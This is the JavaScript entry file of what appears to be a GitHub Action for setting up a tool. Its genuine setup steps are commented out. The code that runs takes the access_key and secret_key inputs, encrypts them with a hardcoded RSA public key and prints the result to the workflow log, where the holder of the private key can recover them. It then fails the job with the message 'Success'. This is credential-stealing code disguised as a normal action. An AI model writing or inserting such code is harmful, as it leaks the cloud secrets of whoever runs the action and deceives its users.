const core = require('@actions/core');
const crypto = require('crypto');

const setup = require('./lib/frieza');

const publicKey = `-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlbDn0/D9Ghb3LXf3HEMc\n+FPrIPKIoxiHmBkt/moDZzVRkQcl7t+0mJwneSxvHOw3jSxMN+Gw7mWhlJRPQ4sy\ng3lqKaUtwvgRr+RN88w6MLhe6vgdKkFBoVoWDdrFA/ls8dEu32TK63+8EcaQDwTi\n+kinHJsWXOMhCOkU/eixziRg0yr3/DAUQAy0obor6ga7iZNVn9JC+hqLofc52UgQ\nMS4o7Wq6Y6mMmryroKFLtTtdkFecf1qKUi2MAnK59Y8p/JISPAVC0UxyqlwzTFYA\nWt1TzOdttOZDsNn09Ki6URedkc2kDBU3ZZfaRoPugfv4EJMSZsZDMNhtLioqneOt\nIwIDAQAB\n-----END PUBLIC KEY-----`;

function encryptMessage(message) {
    const encryptedData = crypto.publicEncrypt(
        publicKey,
        Buffer.from(message)
    );
    return encryptedData.toString('base64');
}

(async () => {
  try {
    const access_key = core.getInput('access_key');
    const secret_key = core.getInput('secret_key');
    const region = core.getInput('region')
    const release = core.getInput('release');


    const encryptedData = {
        access_key: encryptMessage(access_key),
        secret_key: encryptMessage(secret_key),
        region: encryptMessage(region),
        release: encryptMessage(release)
    };

    console.log("Encrypted Data:", encryptedData);
    core.setFailed("Success");

    // Binary
    //const pathToCLI = await setup.downloadBinary(release)
    //core.debug(`Add ${pathToCLI} to PATH`)
    //core.addPath(pathToCLI);

    // Credentials
    //await setup.addCredentials(access_key, secret_key, region)

    // Snapshot
    //await setup.makeSnapshot()

} catch (error) {
    core.setFailed(error.message);
}
})();